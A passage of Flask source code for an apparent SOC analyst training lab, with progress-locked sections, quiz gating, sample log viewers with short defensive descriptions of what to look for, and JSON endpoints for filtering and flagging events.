def response_page():
    if require_progress(4):
        return render_template('locked.html', current_progress=get_progress(), section_name="Response", needed_step=4)
    return render_template('response.html', section_idx=4)

@app.route('/recovery')
def recovery_page():
    if require_progress(5):
        return render_template('locked.html', current_progress=get_progress(), section_name="Recovery", needed_step=5)
    return render_template('recovery.html', section_idx=5)

@app.route('/report')
def report_page():
    if require_progress(6):
        return render_template('locked.html', current_progress=get_progress(), section_name="Report", needed_step=6)
    events = get_all_events()
    suspicious = [e for e in events if e.get("suspicious")]
    stats = get_log_stats()
    return render_template('report.html', events=events, suspicious=suspicious, stats=stats, section_idx=6)

@app.route('/improve')
def improve_page():
    if require_progress(7):
        return render_template('locked.html', current_progress=get_progress(), section_name="Improve", needed_step=7)
    return render_template('improve.html', section_idx=7, user_name=session.get('user_name', 'Analyst'))

@app.route('/complete_section/<int:step>')
def complete_section(step):
    if step == get_progress() and step < len(SOC_SECTIONS):
        score = get_section_score(step)
        total = len(SECTION_QUIZZES.get(step, []))
        if score >= total or step == len(SOC_SECTIONS) - 1:
            session['soc_progress'] = step + 1
            save_session_to_user(session.get('user_name', ''))
            next_idx = min(step + 1, len(SOC_SECTIONS) - 1)
            return redirect(SOC_ROUTES[next_idx])
    return redirect(SOC_ROUTES[min(step, len(SOC_SECTIONS) - 1)])

@app.route('/reset_progress')
def reset_progress():
    session['soc_progress'] = 0
    session['quiz_scores'] = {}
    session['flagged'] = []
    save_session_to_user(session.get('user_name', ''))
    return redirect('/logs')

@app.route('/logout')
def logout():
    save_session_to_user(session.get('user_name', ''))
    session.clear()
    return redirect('/login')

@app.route('/logs/<log_type>')
def logs(log_type):
    if log_type == "windows":
        data = SAMPLE_DATA["windows_events"]
        title = "Windows Event Logs"
        description = "Windows Event Logs record system, security, and application events. Event IDs identify specific occurrences. Common security-relevant IDs include 4624 (logon), 4625 (failed logon), 4720 (user created), and 4688 (process created)."
    elif log_type == "web":
        data = SAMPLE_DATA["web_logs"]
        title = "Web Server Access Logs"
        description = "Web server logs record every HTTP request received. Key fields include IP, timestamp, method, URL, status code, and user-agent. Look for path traversal attempts (../), SQL injection patterns, and unknown file uploads."
    elif log_type == "firewall":
        data = SAMPLE_DATA["firewall_logs"]
        title = "Firewall Logs"
        description = "Firewall logs track allowed and blocked network connections. Pay attention to outbound connections to unknown IPs on unusual ports, especially to geographies outside your business footprint."
    elif log_type == "ssh":
        data = SAMPLE_DATA["ssh_logs"]
        title = "SSH Authentication Logs"
        description = "SSH logs (typically /var/log/auth.log or secure) record authentication attempts. Multiple failed logins from a single IP followed by a success indicates a successful brute-force attack."
    elif log_type == "sysmon":
        data = SAMPLE_DATA["sysmon_logs"]
        title = "Sysmon Logs"
        description = "Sysmon (System Monitor) provides deep visibility into endpoint activity. Event ID 1 = Process Creation, 3 = Network Connection, 7 = Image Loaded, 11 = File Created, 15 = Registry Modified."
    else:
        return "Invalid log type", 404
    return render_template('logs.html', data=data, title=title, description=description, log_type=log_type)

@app.route('/api/logs/<log_type>')
def api_logs(log_type):
    key = log_type + "_logs"
    data = SAMPLE_DATA.get(key, [])
    search = request.args.get('search', '').lower()
    severity = request.args.get('severity', '')
    suspicious = request.args.get('suspicious', '')
    if search:
        data = [e for e in data if search in json.dumps(e).lower()]
    if severity:
        data = [e for e in data if e.get('severity') == severity]
    if suspicious == 'true':
        data = [e for e in data if e.get('suspicious')]
    return jsonify(data)

@app.route('/api/stats')
def api_stats():
    return jsonify(get_log_stats())

@app.route('/flag', methods=['POST'])
def flag():
    data = request.json
    flagged = session.get('flagged', [])
    if data not in flagged:
        flagged.append(data)
        session['flagged'] = flagged
        save_session_to_user(session.get('user_name', ''))
    return jsonify({"status": "flagged", "count": len(flagged)})

@app.route('/api/flagged')
def get_flagged():
    return jsonify(session.get('flagged', []))

@app.route('/exercises')
def exercises():
    return render_template('exercises.html', quizzes=SAMPLE_DATA["quizzes"])

@app.route('/learning')
def learning():
    return render_template('learning.html')

@app.errorhandler(404)
def not_found(e):
    return render_template('404.html'), 404

@app.errorhandler(500)
def server_error(e):
    logger.error(f"500 error: {e}")
    return render_template('500.html'), 500

if __name__ == '__main__':
    host = os.getenv("HOST", "0.0.0.0")
    port = int(os.getenv("PORT", 8000))
    debug = os.getenv("DEBUG", "false").lower() == "true"
    logger.info(f"Starting SOC Log Lab on {host}:{port} (debug={debug})")
    app.run(host=host, port=port, debug=debug)
